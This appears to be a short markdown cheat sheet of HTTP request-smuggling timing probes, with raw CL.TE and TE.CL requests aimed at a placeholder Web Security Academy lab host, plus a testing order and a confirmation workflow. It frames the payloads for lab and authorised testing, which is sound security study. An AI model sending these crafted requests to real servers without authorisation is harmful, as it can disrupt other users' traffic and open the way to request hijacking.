# Desync Testing Payloads

> Use only in deliberately vulnerable labs or systems you are explicitly authorized to test.

## CL.TE timing probe

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If the parsers disagree, the back end may wait for another chunk and produce a delay.

## TE.CL timing probe

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If the back end trusts `Content-Length`, it may wait for additional body bytes.

## Testing order

Test **CL.TE first**. The study material notes that a TE.CL timing test can interfere with other requests when a CL.TE issue is present.

## Confirmation workflow

1. Send the crafted request.
2. Send a normal request separately.
3. Look for a predictable response difference.
4. Keep the URL and parameter names consistent when possible.
5. Stop if testing affects unrelated users.

For safe practice, use PortSwigger Web Security Academy request-smuggling labs.
